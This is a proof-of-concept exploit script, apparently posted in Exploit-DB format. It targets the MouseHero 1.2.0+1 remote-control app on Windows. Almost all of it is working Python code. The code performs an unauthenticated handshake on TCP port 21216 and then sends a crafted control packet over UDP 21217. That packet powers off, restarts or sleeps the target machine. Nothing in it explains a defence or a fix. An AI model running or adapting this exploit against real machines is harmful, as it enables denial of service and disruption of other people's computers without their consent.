# Exploit Title: MouseHero v1.2.0+1 - power-control
# Date: July 26, 2026
# Exploit Author: tmrswrr
# Vendor Homepage: https://mousehero.aprilzz.com
# Software Link: https://downloads-mousehero.aprilzz.com/downloads/MouseHero-Windows-x86_64-latest.zip
# Version: 1.2.0+1
# Tested on: Windows 10 Enterprise LTSC Build 17763
#!/usr/bin/env python3
# MouseHero power-control PoC.
# Usage:
#   python3 mousehero_power_control.py sleep
#   python3 mousehero_power_control.py restart
#   python3 mousehero_power_control.py poweroff
#
# CONTROL event type 9 accepts:
#   1 = poweroff, 2 = restart, 3 = sleep

import socket
import struct
import sys
import time

HOST = "192.168.1.103"
TCP_PORT = 21216
UDP_PORT = 21217

AUTH = 10
CONTROL = 9

OPS = {"poweroff": 1, "restart": 2, "sleep": 3}
ACTION = sys.argv[1] if len(sys.argv) > 1 else "sleep"
if ACTION not in OPS:
    raise SystemExit(f"usage: {sys.argv[0]} [sleep|restart|poweroff]")


def mpu(n):
    if n <= 0x7F:
        return bytes([n])
    if n <= 0xFF:
        return b"\xcc" + struct.pack(">B", n)
    return b"\xcd" + struct.pack(">H", n)


def mpa(*items):
    return bytes([0x90 | len(items)]) + b"".join(items)


def pkt(kind, body, uid=1):
    hdr = mpa(mpu(uid), mpu(kind), mpu(6), mpu(len(body)))
    return struct.pack(">II", 4 + len(hdr) + len(body), len(hdr)) + hdr + body


def recv_all(s, n):
    out = b""
    while len(out) < n:
        chunk = s.recv(n - len(out))
        if not chunk:
            break
        out += chunk
    return out


def auth():
    with socket.create_connection((HOST, TCP_PORT), timeout=5) as s:
        s.sendall(pkt(AUTH, mpa(mpu(1), mpu(3))))
        psize, hsize = struct.unpack(">II", recv_all(s, 8))
        recv_all(s, hsize)
        body = recv_all(s, psize - 4 - hsize)
        return body[2] if len(body) > 2 else 1


uid = auth()
body = mpa(mpu(OPS[ACTION]))
hdr = mpa(mpu(uid), mpu(CONTROL), mpu(1), mpu(247))
packet = struct.pack(">II", 4 + len(hdr) + len(body), len(hdr)) + hdr + body

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as u:
    u.sendto(packet, (HOST, UDP_PORT))
    time.sleep(0.2)
